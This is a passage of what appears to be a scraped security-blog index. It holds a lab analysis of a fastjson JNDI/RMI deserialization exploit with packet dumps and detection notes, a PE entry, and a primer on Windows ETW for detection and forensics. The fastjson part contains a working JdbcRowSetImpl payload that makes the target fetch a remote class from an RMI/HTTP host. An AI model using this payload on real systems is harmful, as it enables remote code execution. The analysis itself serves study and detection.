1{&quot;b&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://192.168.183.1:9999/TouchFile&quot;,&quot;autoCommit&quot;:true},&quot;ixukxrkli7g&quot;:&quot;=&quot;} RMI 过程中，会建立两个连接，Client - RMI Registry 和 Client - RMI Server。 Client - RMI Registry192.168.183.128:35656 --- 192.168.183.1:9999(tcp.stream eq 2) 客户端连接 RMI Registry 10000 4a 52 4d 49 00 02 4b JRMI..K 根据文档 1234567891011121314Header: 0x4a 0x52 0x4d 0x49 Version Protocol Version: 0x00 0x01 Protocol: StreamProtocol SingleOpProtocol MultiplexProtocol StreamProtocol: 0x4b SingleOpProtocol: 0x4c MultiplexProtocol: 0x4d RMI Registry 返回客户端信息 120000 4e 00 0f 31 39 32 2e 31 36 38 2e 31 38 33 2e 31 N..192.168.183.10010 32 38 00 00 8b 48 28...H 0x4e 为 ProtocolAck。0x000f 表示后续 IP 地址长度为 15 字节，即 ASCII 编码的192.168.183.1。0x0000 保留。0x8b48 表示 35656 端口。 可以看出返回的是客户端的信息。 客户端返回自己的内网地址 10000 00 0a 31 37 32 2e 31 38 2e 30 2e 32 00 00 00 00 ..172.18.0.2.... 同上，0x000a 表示长度为 10 的 IP 地址，末尾 0x0000 保留。 客户端向 RMI Registry 发送 Call 12340000 50 ac ed 00 05 77 22 00 00 00 00 00 00 00 00 00 P....w&quot;.........0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................0020 02 44 15 4d c9 d4 e6 3b df 74 00 09 54 6f 75 63 .D.M...;.t..Touc0030 68 46 69 6c 65 hFile 0x50 表示 JRMP Call，后面的以 0xaced 开头的是 Serialization Data，可以看到，结尾是客户端要加载的远程类 TouchFile RMI Registry 返回客户端调用远程方法需要的信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364650000 51 ac ed 00 05 77 0f 01 0f 54 56 ae 00 00 01 7b Q....w...TV....{0010 5c 81 9c 8b 80 01 73 72 00 2a 63 6f 6d 2e 73 75 \\.....sr.*com.su0020 6e 2e 6a 6e 64 69 2e 72 6d 69 2e 72 65 67 69 73 n.jndi.rmi.regis0030 74 72 79 2e 52 65 66 65 72 65 6e 63 65 57 72 61 try.ReferenceWra0040 70 70 65 72 54 5a 0e 24 97 c2 c5 f0 02 00 01 4c pperTZ.$.......L0050 00 07 77 72 61 70 70 65 65 74 00 18 4c 6a 61 76 ..wrappeet..Ljav0060 61 78 2f 6e 61 6d 69 6e 67 2f 52 65 66 65 72 65 ax/naming/Refere0070 6e 63 65 3b 74 00 24 68 74 74 70 3a 2f 2f 31 39 nce;t.$http://190080 32 2e 31 36 38 2e 31 38 33 2e 31 3a 38 30 30 30 2.168.183.1:80000090 2f 23 54 6f 75 63 68 46 69 6c 65 78 72 00 23 6a /#TouchFilexr.#j00a0 61 76 61 2e 72 6d 69 2e 73 65 72 76 65 72 2e 55 ava.rmi.server.U00b0 6e 69 63 61 73 74 52 65 6d 6f 74 65 4f 62 6a 65 nicastRemoteObje00c0 63 74 45 09 12 15 f5 e2 7e 31 02 00 03 49 00 04 ctE.....~1...I..00d0 70 6f 72 74 4c 00 03 63 73 66 74 00 28 4c 6a 61 portL..csft.(Lja00e0 76 61 2f 72 6d 69 2f 73 65 72 76 65 72 2f 52 4d va/rmi/server/RM00f0 49 43 6c 69 65 6e 74 53 6f 63 6b 65 74 46 61 63 IClientSocketFac0100 74 6f 72 79 3b 4c 00 03 73 73 66 74 00 28 4c 6a tory;L..ssft.(Lj0110 61 76 61 2f 72 6d 69 2f 73 65 72 76 65 72 2f 52 ava/rmi/server/R0120 4d 49 53 65 72 76 65 72 53 6f 63 6b 65 74 46 61 MIServerSocketFa0130 63 74 6f 72 79 3b 74 00 24 68 74 74 70 3a 2f 2f ctory;t.$http://0140 31 39 32 2e 31 36 38 2e 31 38 33 2e 31 3a 38 30 192.168.183.1:800150 30 30 2f 23 54 6f 75 63 68 46 69 6c 65 78 72 00 00/#TouchFilexr.0160 1c 6a 61 76 61 2e 72 6d 69 2e 73 65 72 76 65 72 .java.rmi.server0170 2e 52 65 6d 6f 74 65 53 65 72 76 65 72 c7 19 07 .RemoteServer...0180 12 68 f3 39 fb 02 00 00 74 00 24 68 74 74 70 3a .h.9....t.$http:0190 2f 2f 31 39 32 2e 31 36 38 2e 31 38 33 2e 31 3a //192.168.183.1:01a0 38 30 30 30 2f 23 54 6f 75 63 68 46 69 6c 65 78 8000/#TouchFilex01b0 72 00 1c 6a 61 76 61 2e 72 6d 69 2e 73 65 72 76 r..java.rmi.serv01c0 65 72 2e 52 65 6d 6f 74 65 4f 62 6a 65 63 74 d3 er.RemoteObject.01d0 61 b4 91 0c 61 33 1e 03 00 00 74 00 24 68 74 74 a...a3....t.$htt01e0 70 3a 2f 2f 31 39 32 2e 31 36 38 2e 31 38 33 2e p://192.168.183.01f0 31 3a 38 30 30 30 2f 23 54 6f 75 63 68 46 69 6c 1:8000/#TouchFil0200 65 78 70 77 12 00 10 55 6e 69 63 61 73 74 53 65 expw...UnicastSe0210 72 76 65 72 52 65 66 78 00 00 00 00 70 70 73 72 rverRefx....ppsr0220 00 16 6a 61 76 61 78 2e 6e 61 6d 69 6e 67 2e 52 ..javax.naming.R0230 65 66 65 72 65 6e 63 65 e8 c6 9e a2 a8 e9 8d 09 eference........0240 02 00 04 4c 00 05 61 64 64 72 73 74 00 12 4c 6a ...L..addrst..Lj0250 61 76 61 2f 75 74 69 6c 2f 56 65 63 74 6f 72 3b ava/util/Vector;0260 4c 00 0c 63 6c 61 73 73 46 61 63 74 6f 72 79 74 L..classFactoryt0270 00 12 4c 6a 61 76 61 2f 6c 61 6e 67 2f 53 74 72 ..Ljava/lang/Str0280 69 6e 67 3b 4c 00 14 63 6c 61 73 73 46 61 63 74 ing;L..classFact0290 6f 72 79 4c 6f 63 61 74 69 6f 6e 71 00 7e 00 0e oryLocationq.~..02a0 4c 00 09 63 6c 61 73 73 4e 61 6d 65 71 00 7e 00 L..classNameq.~.02b0 0e 74 00 24 68 74 74 70 3a 2f 2f 31 39 32 2e 31 .t.$http://192.102c0 36 38 2e 31 38 33 2e 31 3a 38 30 30 30 2f 23 54 68.183.1:8000/#T02d0 6f 75 63 68 46 69 6c 65 78 70 73 72 00 10 6a 61 ouchFilexpsr..ja02e0 76 61 2e 75 74 69 6c 2e 56 65 63 74 6f 72 d9 97 va.util.Vector..02f0 7d 5b 80 3b af 01 03 00 03 49 00 11 63 61 70 61 }[.;.....I..capa0300 63 69 74 79 49 6e 63 72 65 6d 65 6e 74 49 00 0c cityIncrementI..0310 65 6c 65 6d 65 6e 74 43 6f 75 6e 74 5b 00 0b 65 elementCount[..e0320 6c 65 6d 65 6e 74 44 61 74 61 74 00 13 5b 4c 6a lementDatat..[Lj0330 61 76 61 2f 6c 61 6e 67 2f 4f 62 6a 65 63 74 3b ava/lang/Object;0340 74 00 24 68 74 74 70 3a 2f 2f 31 39 32 2e 31 36 t.$http://192.160350 38 2e 31 38 33 2e 31 3a 38 30 30 30 2f 23 54 6f 8.183.1:8000/#To0360 75 63 68 46 69 6c 65 78 70 00 00 00 00 00 00 00 uchFilexp.......0370 00 75 72 00 13 5b 4c 6a 61 76 61 2e 6c 61 6e 67 .ur..[Ljava.lang0380 2e 4f 62 6a 65 63 74 3b 90 ce 58 9f 10 73 29 6c .Object;..X..s)l0390 02 00 00 74 00 24 68 74 74 70 3a 2f 2f 31 39 32 ...t.$http://19203a0 2e 31 36 38 2e 31 38 33 2e 31 3a 38 30 30 30 2f .168.183.1:8000/03b0 23 54 6f 75 63 68 46 69 6c 65 78 70 00 00 00 0a #TouchFilexp....03c0 70 70 70 70 70 70 70 70 70 70 78 74 00 09 54 6f ppppppppppxt..To03d0 75 63 68 46 69 6c 65 74 00 24 68 74 74 70 3a 2f uchFilet.$http:/03e0 2f 31 39 32 2e 31 36 38 2e 31 38 33 2e 31 3a 38 /192.168.183.1:803f0 30 30 30 2f 23 54 6f 75 63 68 46 69 6c 65 74 00 000/#TouchFilet.0400 03 46 6f 6f .Foo 0x51 表示 ReturnData，后面是序列化的数据。 到这里，有的文章说还有 Ping(0x52)，Ack(0x53) 和 分布式GC(0x54) 的内容，但我这里妹有看到。 Client - RMI Server获取到远程调用需要的信息后，开始加载远程类。 192.168.183.128:32940 --- 192.168.183.1:8000（tcpstream eq 3) Client 通过 HTTP 下载远程类 C# 实现自动化检测对于检测来说，检测到以上第四步，即客户端向 RMI Registry 发送 JRMP Call，即可证明存在漏洞。","link":"/2021/07/20/fastjson/"},{"title":"PE 结构","text":"自制 PE 结构图","link":"/2021/09/18/PE/"},{"title":"A Primer On Event Tracing For Windows (ETW)","text":"A Primer On Event Tracing For Windows (ETW) | by Nasreddine Bencherchali | Aug, 2021 | Medium Finding Detection and Forensic Goodness In ETW Providers | by Nasreddine Bencherchali | Aug, 2021 | Medium What’s ETW ETW 是一个多用途、高速的追踪设施，使用内核中实现的缓存和日志机制。ETW 提供了追踪事件的机制，这些事件可以由用户模式应用程序或者内核模式设备驱动产生。 ——MSDN 杂志 换句话说，ETW 为应用程序和驱动提供了写和发布事件的能力。早期它的设计目标是用于性能监控和解决问题，近年来变为了防御者的检测源。 Architecture 假设有一个程序 A 执行了一些代码，并且希望记录它的操作。一种方式是使用 ETW 注册一个 Provider，这个 Provider 可以向查询它的人提供日志。为了与 Provider 交互，Consumer 必须启动一个 Trace Session。这个 session 会捕捉 Provider 发送的事件。Controller 负责管理这些事情，例如启动和停止一个 session。 Controllers顾名思义，Controllser 负责控制关于 ETW 的一切内容，包括启动和停止 trace sessions 来启用或禁用 providers。一个常用的 controller 是内置的工具logman.exe。 ProvidersProviders 生成日志并写入 ETW sessions。应用程序可以注册为 ETW providers 来写入事件。ETW 支持四种 providers： MOF providers WPP providers Mainfest-based providers TraceLogging providers 本文将重点介绍 Mainfest-based providers，其他 proivders 可以参考About Event Tracing - Win32 apps。 一个 provider 写入事件之前，它需要描述事件是如何组织的。对 Mainfest-Based provider 来说，这些内容记录在 Instrumentation Mainfest 中，它包含了关于事件的所有信息，包括如何过滤，它们的值、ID和描述等等。这些细节可以参考 MSDN Writing an Instrumentation Mainfest - Win32 apps。 虽然存在一些解析器，但是理解每个字段的含义仍是有帮助的。首先，Instrumentation Mainfest 是一个 XML 格式的文件，所有内容都是 XML 元素，包括 &lt;provider&gt;第一个元素是 provider，是必须的，通常具有以下属性： name，表示 provider 的名称，使用类似于 logman 的工具时会显示名称 resourceFilteName / messageFileName，分别是包含了元数据/消息资源的 EXE 或 DLL 文件 parameterFilePath，包含字符串资源的 EXE / DLL 文件 这个元素实际上提供的是 provider 的标识和必须的元数据和字符串，想要消费这个 provider 的工具使用这些来获取事件。 &lt;channels&gt;如果熟悉 Event Viewer 的话可能对 channels 比较熟悉。 共有四种 channel： Admin Operational Analytic Debug 当我们想向特定 channels 写入事件时可以使用 channels 元素，它包含以下属性： child，唯一标识符，可以在其他元素中引用 name，channel 名，通常使用 provider 名后加/和 channel 类型，例如Microsoft-Windows-Windows Defender/Operational type，上面四种类型之一 MSDN 上的一个例子： 123456&lt;channel chid=&quot;c1&quot; name=&quot;Microsoft-Windows-Windows Defender/Operational&quot; symbol=&quot;CHANNEL_DEFENDER_OPERATIONAL&quot; type=&quot;Operational&quot;/&gt; &lt;levels&gt;level 元素用于定义不同的日志级别，基于这些级别可以将事件分组。根据 MSDN，常用的日志级别如下： win:Critical(1) win:Error(2) win:Warning(3) win:Informational(4) win:Verbose(5) 如上图，还存在其他一些预定义的和保留的级别。Providers 也可以定义级别，例如 Powershell provider 定义了 20 用于 debug Consumer 可以使用这些级别作为一种过滤机制来获取指定级别的事件。 &lt;tasks&gt; &amp; &lt;opcodes&gt;这两个元素用于将事件按照 任务 或者 操作 分组。例如Microsoft-Windows-Kernel-Process provider 定义了如下的 tasks 123456...&lt;task name=&quot;ProcessStart&quot; message=&quot;ProcessStart&quot; value=&quot;1&quot;/&gt;&lt;task name=&quot;ProcessStop&quot; message=&quot;ProcessStop&quot; value=&quot;2&quot;/&gt;&lt;task name=&quot;ThreadStart&quot; message=&quot;ThreadStart&quot; value=&quot;3&quot;/&gt;&lt;task name=&quot;ThreadStop&quot; message=&quot;ThreadStop&quot; value=&quot;4&quot;/&gt;... Consumer 同样可以使用这些自解释的 tasks 来过滤出想要的事件。Tasks 一般包含 name，message 和 value 属性。 类似 tasks，opcodes 用于描述特定的操作，例如Microsoft-Windows-Powershell provider 为 task connetct 定义了如下的 opcodes： 1234567&lt;task name=&quot;Connect&quot; message=&quot;Connect&quot; value=&quot;1&quot;&gt; &lt;opcodes&gt; &lt;opcode name=&quot;Open(async)&quot; message=&quot;Open(async)&quot; value=&quot;10&quot;/&gt; &lt;opcode name=&quot;tobeusedwhenanobjectisconstructed&quot; message=&quot;tobeusedwhenanobjectisconstructed&quot; value=&quot;16&quot;/&gt; &lt;opcode name=&quot;Tobeusedwhenoperationisjustexecutingamethod&quot; message=&quot;Tobeusedwhenoperationisjustexecutingamethod&quot; value=&quot;20&quot;/&gt; &lt;/opcodes&gt;&lt;/task&gt; Windows SDK 中的 winmeta.xml 文件包含了一些预定义的 opcodes，也可以在 OpcodeType Complex Type -Win32 apps中找到。 &lt;keywords&gt;类似于 level 和 task，keyword 也是一种分组机制，包括以下属性： message，描述 keyword 的字符串 name，唯一的名称，例如ProcessStart mask，只有一个 1 的二进制掩码 例如Microsoft-Windows-Kernel-Process provider： 12345678...&lt;keywords&gt; &lt;keyword name=&quot;WINEVENT_KEYWORD_PROCESS&quot; message=&quot;WINEVENT_KEYWORD_PROCESS&quot; mask=&quot;0x10&quot;/&gt; &lt;keyword name=&quot;WINEVENT_KEYWORD_THREAD&quot; message=&quot;WINEVENT_KEYWORD_THREAD&quot; mask=&quot;0x20&quot;/&gt; &lt;keyword name=&quot;WINEVENT_KEYWORD_IMAGE&quot; message=&quot;WINEVENT_KEYWORD_IMAGE&quot; mask=&quot;0x40&quot;/&gt; &lt;keyword name=&quot;WINEVENT_KEYWORD_CPU_PRIORITY&quot; message=&quot;WINEVENT_KEYWORD_CPU_PRIORITY&quot; mask=&quot;0x80&quot;/&gt;&lt;/keywords&gt;... &lt;maps&gt;maps 定义了一个值和字符串之间的关系，在解析事件数据时作为一个转换机制。例如一个事件可能返回一些值，这些值与特定字符串对应，可以在 maps 中找到，```Microsoft-Windows-DNS-Client`` provider 中： 123456&lt;maps&gt;&lt;valueMap name=&quot;DnsIpTypeMap&quot;&gt;&lt;map value=&quot;0x0&quot; message=&quot;static&quot;/&gt;&lt;map value=&quot;0x1&quot; message=&quot;dynamic&quot;/&gt;&lt;/valueMap&gt;&lt;/maps&gt; &lt;templates&gt;如果事件生成的信息是自解释的，就不需要额外信息描述事件。但当事件包含特殊信息时，就需要定义 template 来描述增加的字段。 例如我们有一些操作会生成一个事件，这个事件包括了一些动态数据需要映射 1Message : Correlating activity id's. %n %t CurrentActivityId: %1 %n %t ParentActivityId: %2 Consumer 需要用合适的值来替换其中的%1和%2，这时需要定义的模板如下： 1234&lt;template tid=&quot;T_CorrelationEvent&quot;&gt;&lt;data inType=&quot;win:GUID&quot; name=&quot;currentActivityId&quot; /&gt;&lt;data inType=&quot;win:GUID&quot; name=&quot;parentActivityId&quot; /&gt;&lt;/template&gt; 其中%1代表 currentActivityId，%2代表 parentActivityId。template 的属性包括类型信息和它是否呗映射到类似于 maps 的元素。 &lt;event&gt;类似于写程序时定义变量、定义函数和类的过程，以上的元素也是在做类似的事情。定义了事件如何组织后，接下来就是定义事件本身。 对于每个事件都必须定义 event 元素，这个元素必须包含一个标识符或者唯一的值（这个值通常称为 Event ID 或 EID）。 例如Microsoft-Windows-Kernel-Process provider： 1&lt;event value=&quot;1&quot; symbol=&quot;ProcessStart&quot; version=&quot;0&quot; task=&quot;ProcessStart&quot; opcode=&quot;win:Start&quot; level=&quot;win:Informational&quot; keywords=&quot;WINEVENT_KEYWORD_PROCESS&quot; template=&quot;ProcessStartArgs&quot;/&gt; 这里包含了必须的 value 属性，意味着如果我们想捕捉这个事件我们可以搜索Event Id = 1。另外外门也可以看见前面提到的各种属性，它们引用了之前的定义。这些可以用于 consumer 的过滤。 &lt;localization&gt;例如以下 task 元素中： 1&lt;task name=&quot;ProcessStart&quot; message=&quot;$(string.task_ProcessStart)&quot; value=&quot;1&quot;/&gt; message 的值时一个变量，引用了定义在 localization 元素中的字符串： 12345678910&lt;localization&gt;&lt;resources culture=&quot;en-GB&quot;&gt;&lt;stringTable&gt;&lt;string id=&quot;keyword_WINEVENT_KEYWORD_PROCESS&quot; value=&quot;WINEVENT_KEYWORD_PROCESS&quot;/&gt;&lt;string id=&quot;keyword_WINEVENT_KEYWORD_THREAD&quot; value=&quot;WINEVENT_KEYWORD_THREAD&quot;/&gt;&lt;string id=&quot;keyword_WINEVENT_KEYWORD_IMAGE&quot; value=&quot;WINEVENT_KEYWORD_IMAGE&quot;/&gt;...&lt;/stringTable&gt;&lt;/resources&gt;&lt;/localization&gt; 使用 provider mainfest 的例子可以更好了解这些，例如ETW-Resources/Microsoft-Windows-Kernel-Process.mainfest.xml at main masbench/ETW-Resources。 Trace Sessions / Trace Files (.etl)Trace sessions 只是一种启动/预定一组 providers 的机制，可以包含一些配置。这些配置包含 session 是否是实时的还是写入 trace files (.etl) 等。 Trace sessions 有两种 keyword 掩码类型来启用 providers（稍后解释）： Keyword(Any)：可以指定一个 8 字节的十六进制掩码表示一个或多个 keywords Keyword(All)：一个可选的 8 字节的十六进制掩码，进一步限制 ETW providers 写入的事件类别 假如存在以下三个关键字： READ: 001 LOCAL Events: 010 REMOTE Events: 100 和两个事件： 事件 1，使用 READ 和 LOCAL keywords (011) 事件 2，使用 READ 和 REMOTE keyword (101) Keyword(Any) 让我们可以指定一个掩码来过滤出掩码符合的事件。 比如我们想要读取事件，我们可以将 Keyword(Any) 设置为 001，这样就可以获取所有掩码最后一位设置为 1 的事件，即事件 1 和事件 2。如果我们需要更精确地过滤事件，可以将 Keyword(All) 设置为 101 来获取事件 2 或者设置为 011 获取事件 1。 换句话说，Any 过滤器匹配的事件掩码至少包含了指定的位。而 All 过滤器要求事件掩码所有的位都符合。这可以帮助我们了解捕捉了哪些事件。 ConsumersConsumers 时读取或监听 Trace Files / Sessions 的一个程序。一个常见的 consumer 时 Event Viewer。 Interacting With ETWLogmanlogman 是一个 Windows 内置的工具，作为 controller。 Windows 中默认有超过 100 个已注册的 providers 和至少 20 个 trace sessions。使用 logman 可以列出它们： 12345678910111213&gt; logman query providersProvider GUID-------------------------------------------------------------------------------.NET Common Language Runtime {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}ACPI Driver Trace Provider {DAB01D4D-2D48-477D-B1C3-DAAD0CE6F06B}Active Directory Domain Services: SAM {8E598056-8993-11D2-819E-0000F875A064}Active Directory: Kerberos Client {BBA3ADD2-C229-4CDB-AE2B-57EB6966B0C4}Active Directory: NetLogon {F33959B4-DBEC-11D2-895B-00C04F79AB69}ADODB.1 {04C8A86F-3369-12F8-4769-24E484A9E725}ADOMD.1 {7EA56435-3F2F-3F63-A829-F0B35B5CAD41}Application Popup {47BFA2B7-BD54-4FAC-B70B-29021084CA8F}Application-Addon-Event-Provider {A83FA99F-C356-4DED-9FD6-5A5EB8546D68}... 也可以查询指定的 provider 1234567891011121314151617181920&gt; logman query providers &quot;Microsoft-Windows-WMI-Activity&quot;Provider GUID--------------------------------------------------------------------Microsoft-Windows-WMI-Activity {1418EF04-B0B4-4623-BF7E-D74AB47BBDAA}Value Keyword Description--------------------------------------------------------------------0x8000000000000000 Microsoft-Windows-WMI-Activity/Trace0x4000000000000000 Microsoft-Windows-WMI-Activity/Operational0x2000000000000000 Microsoft-Windows-WMI-Activity/DebugValue Level Description--------------------------------------------------------------------0x02 win:Error Error0x04 win:Informational InformationPID Image--------------------------------------------------------------------0x000012d4 C:\\Windows\\System32\\wbem\\WmiPrvSE.exe0x00000dd4 C:\\Windows\\System32\\svchost.exe0x00000dd4 C:\\Windows\\System32\\svchost.exe0x00000cb4 C:\\Windows\\System32\\wbem\\WmiPrvSE.exe0x00000a30 C:\\Windows\\System32\\svchost.exe 其中 keyword 和 levels 在上面已经提到，PID 和 Image 包含了正在使用这个 provider 发送信息的进程。 也可以查询 trace sessions： 1234567891011121314&gt; logman.exe query -etsData Collector Set Type Status--------------------------------------------------------------------...Circular Kernel Context Logger Trace RunningEventlog-Security Trace RunningDiagLog Trace RunningDiagtrack-Listener Trace RunningEventLog-Application Trace RunningEventLog-System Trace RunningLwtNetLog Trace RunningNetCore Trace RunningNtfsLog Trace Running... 查询具体某个 trace session 的 type 和 providers 的消息： 12345678910111213141516171819202122232425262728293031323334353637383940414243&gt; logman.exe query &quot;EventLog-System&quot; -etsName: EventLog-SystemStatus: RunningRoot Path: %systemdrive%\\PerfLogs\\AdminSegment: OffSchedules: OnSegment Max Size: 100 MBName: EventLog-System\\EventLog-SystemType: TraceAppend: OffCircular: OffOverwrite: OffBuffer Size: 64Buffers Lost: 0Buffers Written: 1345Buffer Flush Timer: 1Clock Type: SystemFile Mode: Real-timeProvider:Name: Microsoft-Windows-FunctionDiscoveryHostProvider Guid: {538CBBAD-4877-4EB2-B26E-7CAEE8F0F8CB}Level: 255KeywordsAll: 0x0KeywordsAny: 0x8000000000000000 (System)Properties: 65Filter Type: 0Provider:Name: Microsoft-Windows-Subsys-SMSSProvider Guid: {43E63DA5-41D1-4FBF-ADED-1BBED98FDD1D}Level: 255KeywordsAll: 0x0KeywordsAny: 0x4000000000000000 (System)Properties: 65Filter Type: 0Provider:Name: Microsoft-Windows-Kernel-GeneralProvider Guid: {A68CA8B7-004F-D7B6-A698-07E2DE0F1F5D}Level: 255KeywordsAll: 0x0KeywordsAny: 0x8000000000000000 (System)Properties: 65Filter Type: 0... 使用这些命令，我们可以： 获取可用的 provider 的列表，可以对比来发现 Windows 新版本中新增的 provider 获取 provider 的重要信息，例如 keyword 和 levels 列出 trace sessions，或许可以检测出安装的一些软件（EDR 或者 AV） Performance Monitor虽然使用 logman 可以创建、开始、停止和更新 trace sessions，但是更快速的方法是使用 Performance Monitor。 双击会话可以看到相关的所有信息，也可以修改这些 sessions，添加或删除 providers 和通过 User Defined 菜单创建新 session。 Powershell (.NET)使用 Powershell(.NET) 中的命名空间System.Diagnostics.Eventing.Reader，System.Diagnostics.Eventing.Reader Namespace。 列出所有 providers 1[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.GetProviderNames() 列出特定 Provider 的属性 1234567891011121314# [System.Diagnostics.Eventing.Reader.ProviderMetadata](&quot;Microsoft-Windows-Powershell&quot;)Name : Microsoft-Windows-PowershellId : a0c1853b-5c40-4b15-8766-3cf1c58f985aMessageFilePath : C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PSEvents.dllResourceFilePath : C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PSEvents.dllParameterFilePath :HelpLink : https://go.microsoft.com/fwlink/events.asp?CoName=Microsoft Corporation&amp;ProdName=Microsoft® Windows® Operating System&amp;ProdVer=10.0.19041.1&amp;FileName=PSEvents.dll&amp;FileVer=10.0.19041.1DisplayName :LogLinks : {Microsoft-Windows-PowerShell/Operational, Microsoft-Windows-PowerShell/Analytic, Microsoft-Windows-PowerShell/Debug, Microsoft-Windows-PowerShell/Admin}Levels : {win:Error, win:Warning, win:Informational, win:Verbose...}Opcodes : {win:Start, win:Stop, Open, Close...}Keywords : {Runspace, Pipeline, Protocol, Transport...}Tasks : {CreateRunspace, ExecuteCommand, Serialization, Powershell-Console-Startup...}Events : {4097, 4098, 4099, 4100...} 查询特定的对象 123456789101112131415161718192021# [System.Diagnostics.Eventing.Reader.ProviderMetadata](&quot;Microsoft-Windows-Powershell&quot;) | Select-Object -ExpandProperty OpcodesName Value DisplayName---- ----- -----------win:Start 1 Startwin:Stop 2 StopOpen 10 Open (async)Close 11 Close (Async)Connect 12 connectDisconnect 13 DisconnectNegotiate 14 NegotiateCreate 15 On create callsConstructor 16 to be used when an object is constructedDispose 17 To be used when an object is disposedEventHandler 18 To be used when an event handler is raisedException 19 To be used when an exception is raisedMethod 20 To be used when operation is just executing a methodSend 21 Send (Async)Receive 22 Receive (Async)Rehydration 23 RehydrationSerializationSettings 24 Serialization settingsShuttingDown 25 Shutting down Message Analyzer微软已停止维护，并且不提供下载。 Extracting ETW Providers我们有了一些与 ETW 交互的方法，但是有时我们只是想获得 provider mainfest，一个文件而不是对象的属性，这时我们有一些方法提取这些 mainfest。 ETW Explorer / Perfview这两者实际上使用了相同的底层 API 来提取 provider mainfest： 1RegisteredTraceEventParser.GetManifestForRegisteredProvider zodiacon/EtwExplorer: View ETW Provider manifest (github.com) 类似可以使用 perfview dump provider mainfest，选择 File -&gt; User Command 或者 Alt + U，使用以下命令： 1DumpRegisteredManifest providerName [outputFileName] Dump mainfest 时需要注意文件有时不会包括所有的 XML 元素，这是 dumping 功能实现方式决定的。perfview/RegisteredTraceEventParser.cs at 6b4771eecba5ed00555a34d70e19a8742af4ee0a · microsoft/perfview (github.com) WEPExplorer类似于 ETW Explorer，WEPExplorer 可以用来查看 ETW provider mainfests，WinTools/WEPExplorer at master · lallousx86/WinTools (github.com)。 这个工具使用了Getting a Provider’s Metadata - Win32 apps | Microsoft Docs中的概念和 winevt API。这个工具中的信息包括了 mainfest 中可用的元素，并且当双击一个 provider 时会自动生成对应的 XML 文件，保存在启动目录下。 Script ETW通过编程方式与 ETW 交互的选项有以下几种： KrabsETW SilkETW PyWintrace Powershell(.NET) WinAPI (Tdh.dll, Wevtapi.dll) More ETWVisualizing “Analytic” / “Debug” Channels使用 WEPExplorer 时，可以看到许多 ETW providers 输出到到 Debug 或者 Ananlytic channels。默认情况下这些 channel 不会显示，但是可以在 Event Viewer 点击 View 来启用。 显示了之后，需要右键相应的日志来启用。 这时系统将为这个 provider 创建一个新的 trace session。 Regist(ry)ered ETW Providers注册表中的下列位置保存了注册的 ETW providers 1HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Publishers\\ 可以看到 ResourceFileName 和 MessageFileName 是同一个位置，这个文件的二进制结构中包含了 Mainfest 定义，下图是使用 resource hacker 的情况。 Providers for detection and forensic以下事件使用 python 库 pywintrace 捕捉。 Microsoft-Windows-Kernel-Process Event EID CHANNEL Description Example Process Creation 1 Microsoft-Windows-Kernel-Process/Analytic Capture process creation Thread Start 3 Microsoft-Windows-Kernel-Process/Analytic Capture thread start in a process Image Load 5 Microsoft-Windows-Kernel-Process/Analytic Capture when an Image is being loaded into a process Process termination(Stop) 2 Image unload 6 Microsoft-Windows-Kernel-FIle Event EID CHANNEL Description Example File Creation 10 / 30 Microsoft-Windows-Kernel-File/Analytic Capture file creation event File Deletion 11 Microsoft-Windows-Kernel-File/Analytic Capture file deletion Microsoft-Windows-Kernel-Network Event EID CHANNEL Description Example Attemped Connectio 12 Microsoft-Windows-Kernel-Network/Analytic Capture attempts of initial connection to an IP Established Connection 15 Microsoft-Windows-Kernel-Network/Analytic N° of Bytes Transmitted / Received 10 / 11 Microsoft-Windows-Kernel-Netword/Analytic Capture the number of bytes transmitted and received 以上所有 event 都会捕捉 TCPv4 数据，N° of Bytes Transmitted / Received 也会捕捉 TCPv6，UDPv4 和 v6。 Microsoft-Windows-Kernel-Registry Event EID CreateKey 1 OpenKey 2 DeleteKey 3 QueryKey 4 SetValueKey 5 DeleteValueKey 6 QueryValueKey 7 EnumerateKey 8 EnumerateValueKey 9 这些 event 都在 Microsoft-WIndows-Kernel-Registry/Analytic 中。 Microsoft-Windows-Services-Svchost Event EID Channel Example Svchost Process Start 101 Microsoft-Windows-Services-Svchost/Diagnostic Svchost Process Stop 102 Microsoft-Windows-Services-Svchost-Diagnostic Microsoft-Windows-LDAP-Client Evnet EID Channel Description Example LDAP Search 30 Microsoft-Windows-LDAP-Client/Debug Captures ldap search from different LDAP clients 日过使用了类似于 MMC console Active Directory Users and Computers 也会得到相同结果。Event 由 wldap32.dll 处理，每个加载了它的进程都会生成这些事件。 Microsoft-Windows-COMRuntime Event EID Channel Example COM Interface Usage / Call 2 Microsoft-Windows-COMRuntime/Tracing Microsoft-Windows-Winlogon除了包括 Operational channel 中的 event 以外，还包括一些 Diagnostic 的： Fail 和 Succesful 的 Lock 和 Unlock 尝试 Succesful 和 Failed 的登录 下面展示了锁定和解锁的情况： 1234567891011121314151617181920212223242526272829303132333435363738394041424344TimeStamp: 2021-08-25 22:27:10EID: 6113Operation: LOCKProcessId: 712ProcessName: winlogon.exeProcess Commandline: winlogon.exeThreadId: 460Event Description: LOCK Started--------------------------------------------------------------------TimeStamp: 2021-08-25 22:27:15EID: 6105Operation: UNLOCKProcessId: 712ProcessName: winlogon.exeProcess Commandline: winlogon.exeThreadId: 460Event Description: UNLOCK Started--------------------------------------------------------------------TimeStamp: 2021-08-25 22:27:15EID: 6107Operation: UNLOCKProcessId: 712ProcessName: winlogon.exeProcess Commandline: winlogon.exeThreadId: 460Event Description: UNLOCK Failed (Reason : 1326)--------------------------------------------------------------------TimeStamp: 2021-08-25 22:27:17EID: 6105Operation: UNLOCKProcessId: 712ProcessName: winlogon.exeProcess Commandline: winlogon.exeThreadId: 460Event Description: UNLOCK Started--------------------------------------------------------------------TimeStamp: 2021-08-25 22:27:17EID: 6106Operation: UNLOCKProcessId: 712ProcessName: winlogon.exeProcess Commandline: winlogon.exeThreadId: 460Event Description: UNLOCK Successful (Reason : 0) Microsoft-Windows-TerminalServices-ClientActiveXCore这个 provider 通过 Microsoft-Windows-TerminalServices-RDPClient 的 operational 和 analytic 导出了一些事件。 EID 1001 和 EID 1102 